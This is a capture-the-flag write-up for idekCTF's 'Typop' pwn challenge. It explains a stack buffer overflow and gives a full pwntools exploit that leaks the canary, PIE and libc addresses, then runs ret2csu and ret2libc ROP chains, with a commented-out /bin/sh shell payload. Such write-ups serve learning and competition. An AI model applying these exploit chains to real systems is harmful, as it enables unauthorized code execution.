# PWN
## Typop
`writer : Uno (yqroo)`
### Tools
- gdb + pwndbg
- pwntools
- ghidra

### Intro
This is my first time writing writeup in markdown and also my first public ctf writeup, I'm sorry if i have bad explanation nor incorrect, but i hope this 
will help you understanding the chall and solution, big thanks.

### Chall Explained
So it was actually a feedback program, where the program will prompt some question on loop, first question is `Do you want to complete a survey?` we have 
to answer it with y or at least having y as the first char e.g yes, yyy, ynot, etc if we not do that the program die, then the second question pop out 
`Do you like ctf?`, do i like ctf?? of course so i will answer it with yes or y, but actually it's ok if you answer it with no or something else, because 
the program will continue to prompt either `Aww :( Can you provide some extra feedback?` or `That's great! Can you provide some extra feedback?` and that's 
actually our third question you can type anything i guess ;).

### Disassemble
To understand the program better let's do disassemble, i use ghidra because open source and free, but before that let's actually do some basic checksec and 
file.

checksec : 
```
[*] '/home/uno/Documents/solve/PWN_typop_idek/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

file :
```
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=47348e907e6bd456810c6015278d5e43110c8318, for GNU/Linux 3.2.0, not stripped
```
Great not stripped, so we can easily find main on ghidra and disassemble it
```c
undefined8 main(void)

{
  int check_y;
  
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    check_y = puts("Do you want to complete a survey?");
    if (check_y == 0) {
      return 0;
    }
    check_y = getchar();
    if (check_y != 0x79) break;
    getchar();
    getFeedback();
  }
  return 0;
}
```
main was calling another interesting function `getFeedback()`
```c
/* WARNING: Could not reconcile some variable overlaps */

void getFeedback(void)

{
  long in_FS_OFFSET;
  undefined8 buffer;
  undefined2 local_12;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  buffer = 0;
  local_12 = 0;
  puts("Do you like ctf?");
  read(0,&buffer,0x1e);
  printf("You said: %s\n",&buffer);
  if ((char)buffer == 'y') {
    printf("That\'s great! ");
  }
  else {
    printf("Aww :( ");
  }
  puts("Can you provide some extra feedback?");
  read(0,&buffer,0x5a);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
note : i changed some variable name (canary & buffer)

but if you list all the functions that the program has, it has one function that will give us flag, yes win function
```c
/* WARNING: Could not reconcile some variable overlaps */

void win(undefined param_1,undefined param_2,undefined param_3)

{
  FILE *__stream;
  long in_FS_OFFSET;
  undefined8 local_52;
  undefined2 local_4a;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_4a = 0;
  local_52 = CONCAT17(0x74,CONCAT16(0x78,CONCAT15(0x74,CONCAT14(0x2e,CONCAT13(0x67,CONCAT12(param_3,
                                                  CONCAT11(param_2,param_1)))))));
  __stream = fopen((char *)&local_52,"r");
  if (__stream == (FILE *)0x0) {
    puts("Error opening flag file.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fgets((char *)&local_48,0x20,__stream);
  puts((char *)&local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
if you look closely win needs 3 arguments so we need to do ret2csu not just a simple ret2win.

```c
local_52 = CONCAT17(0x74,CONCAT16(0x78,CONCAT15(0x74,CONCAT14(0x2e,CONCAT13(0x67,CONCAT12(param_3,
                                                  CONCAT11(param_2,param_1)))))));
```
this line of code is actually concating string t + x + t + . + g + arg3 + arg2 + arg1, we have to put f , l and a in arg 1,2,3.

### Exploit
After analyzing it we know that the program has Buffer Overflow. As we can see the second question read `0x1e` size the third read `0x5a` and can 
causes stack smashing (since they enabled the canary protection), but if you look closely they has printf with `%s` as the format 
specifier, and not just that the third question uses the same buffer, but what can we do with it?? so simply we can leak canary and escape from stack 
smashing, beautiful isn't it.

To leak it you need to input character until it touch the null byte of the canary, let's implement this with pwntools.
```python
p.recv()
p.sendline(b'y'*10)

can_buff = p.recvuntil(b'Can you provide some extra feedback?').split(b'\n')
indx = 2 # sometimes 1,2 
canary = u64(can_buff[indx][:7].rjust(8, b'\x00')) 
win_buff = u64(can_buff[indx][7:].ljust(8, b'\x00'))
info("canary: %#x", canary)
info("stack: %#x", win_buff)

payload = flat(
    b'y' * 10,
    canary
)

p.sendline(payload)
```
So first we leak canary then with the third question we recover it (put the canary back) so the program won't close, and i notice that the program also leak
something else, apparently it was a stack address to be precise it was stack address after the canary, so i decided to save it for later use.

What i have to do next is leaking PIE, i use the same technique the only difference is the amoung of char that i'm using
```python
payload = flat(
    b'y' * 25
)

p.recvuntil(b'Do you like ctf?')
p.sendline(payload)

leak = u64(p.recvuntil(b'Can you provide some extra feedback?').split(b'\n')[2].ljust(8, b'\x00')) # sometimes 1, 2
piebase = leak - 0x0000000000001447
win = piebase + elf.symbols.win
info("leak: %#x", leak)
info("pie: %#x", piebase)
info("win: %#x", win)

ret = piebase + 0x000000000000101a # or piebase + (rop.find_gadget(['ret']))[0] but need to set rop = ROP(exe)
rdi = piebase + 0x00000000000014d3 # or piebase + (rop.find_gadget(['pop rdi', 'ret']))[0]
rsi = piebase + 0x00000000000014d1 # # or piebase + (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]

popper = piebase + 0x14ca
caller = piebase + 0x14b0
```
Consider the intended solution was ret2csu so i need to calculate some gadgets, rdi, rsi, popper, caller was some mandatory gadgets to do that, you can
search the gadget with `ropper` or `ROPgadget` even pwntools.

So actually we completed the exploit and we just have to send the final ret2csu payload to trigger the win function, but you can also solve this challenge with ret2libc you need toleak the libc address first, here's how.
```python
payload = flat(
    b'y' * 10,
    canary,
    b'\x90'*8,
    rdi,
    piebase + elf.got.puts,
    piebase + elf.symbols.puts,
    piebase + elf.symbols.main
)
p.sendline(payload)

leak = u64(p.recvuntil(b'Do you want to complete a survey?').split(b'\n')[1].ljust(8, b'\x00'))
libc.address = leak - libc.symbols.puts
info("leak: %#x", leak)
info("leak: %#x", libc.address)

# rop = ROP(libc)
rdx = libc.address + 0x000000000011f497 # (rop.find_gadget(['pop rdx']))[0]
```
So we able to leak libc and restart the program back to main, awesome.

Note: the rdx gadget wasn't necessary and it just rubish, i have an idea to use that gadget to solve with ret2win since the payload max size is just `0x5a`
but i failed to execute it and to lazy to debug nor delete it hehe i'm sorry.

So to summarize to solve this chall we need to leak canary -> put back so it won't crash -> leak pie -> search gadget -> solution. and i found 3 solution to
solve this challenge (actually 2 because 1 wasn't work) 

1. ret2csu(intended) 
2. ret2libc 
3. ret2win with libc gadget (pop rdx)

Here's my complete solution
```python
# idekCTF easiest pwn chall, but i'm too noob to solve it that fast

from pwn import *
from time import sleep

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

cmd = '''
'''

# +++local+++
# p = process(exe)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p)

# +++remote+++
p = remote('typop.chal.idek.team', 1337)
libc = ELF('libc6-i386_2.31-17_amd64.so') # it's not the correct one, already tried to search it

# =========================================Leaking canary========================================

p.recv()
p.sendline(b'y')

p.recv()
p.sendline(b'y'*10)

can_buff = p.recvuntil(b'Can you provide some extra feedback?').split(b'\n')
indx = 2 # sometimes 1,2 
canary = u64(can_buff[indx][:7].rjust(8, b'\x00')) 
win_buff = u64(can_buff[indx][7:].ljust(8, b'\x00'))
info("canary: %#x", canary)
info("stack: %#x", win_buff)

payload = flat(
    b'y' * 10,
    canary
)

p.sendline(payload)

# =========================================Leaking piebase=======================================

p.recvuntil(b'Do you want to complete a survey?')
p.sendline(b'y')

payload = flat(
    b'y' * 25
)

p.recvuntil(b'Do you like ctf?')
p.sendline(payload)

leak = u64(p.recvuntil(b'Can you provide some extra feedback?').split(b'\n')[2].ljust(8, b'\x00')) # sometimes 1, 2
piebase = leak - 0x0000000000001447
win = piebase + elf.symbols.win
info("leak: %#x", leak)
info("pie: %#x", piebase)
info("win: %#x", win)

ret = piebase + 0x000000000000101a # or piebase + (rop.find_gadget(['ret']))[0] but need to set rop = ROP(exe)
rdi = piebase + 0x00000000000014d3 # or piebase + (rop.find_gadget(['pop rdi', 'ret']))[0]
rsi = piebase + 0x00000000000014d1 # # or piebase + (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]

popper = piebase + 0x14ca
caller = piebase + 0x14b0

# ===========================Leaking libc(no need for intended solution)=========================

payload = flat(
    b'y' * 10,
    canary,
    b'\x90'*8,
    rdi,
    piebase + elf.got.puts,
    piebase + elf.symbols.puts,
    piebase + elf.symbols.main
)
p.sendline(payload)

leak = u64(p.recvuntil(b'Do you want to complete a survey?').split(b'\n')[1].ljust(8, b'\x00'))
libc.address = leak - libc.symbols.puts
info("leak: %#x", leak)
info("leak: %#x", libc.address)

# rop = ROP(libc)
rdx = libc.address + 0x000000000011f497 # (rop.find_gadget(['pop rdx']))[0]

# =====================================finish it (solution)======================================

p.sendline(b'y')

p.recvuntil(b'Do you like ctf?')
p.sendline(b'y')

# # +++gain shell+++++  --> work locally, didn't work on sever, failed to search server libc version, but seriously how to know server libc version from dockerfile
# payload = flat(
#     b'y' * 10,
#     canary,
#     b'\x90'*8,
#     rdi,
#     next(libc.search(b'/bin/sh\x00')),
#     ret,
#     libc.symbols.system
# )

# # ++++win libc tapi gagal++++ --> didn't work, skill issue
# payload = flat(
#     b'y' * 10,
#     canary,
#     b'\x90'*8,
#     rdx,
#     libc.address+ 0x16a64,
#     0x0,
#     rsi,
#     piebase + 0x572,
#     0x0,
#     rdi,
#     piebase + 0x579,
#     win
# )

# +++win csu (intended)+++
payload = flat(
    b'y' * 10,
    canary,
    win,
    popper,
    0x0,
    0x1,
    ord('f'),
    ord('l'),
    ord('a'),
    win_buff,
    caller,
)

p.recvuntil(b"That's great! Can you provide some extra feedback?")
p.send(payload)

p.interactive()
```
If you remember win_buff is address after canary, and when i use ret2csu the caller gadgets call [r15 + rbx*0x8] so basically it was calling function inside r15 and what inside my r15 is address that point to win functions.

Note : If you look closely i have some comments on the solver, and i don't find the correct libc version from the leak(puts), after the competition i found
out how to know libc version from Dockerile, first need to run the docker then just copy the docker libc to local 
`docker cp --follow-link 859828691e52:/srv/usr/lib/x86_64-linux-gnu/libc.so.6 ./` you need to change the container id
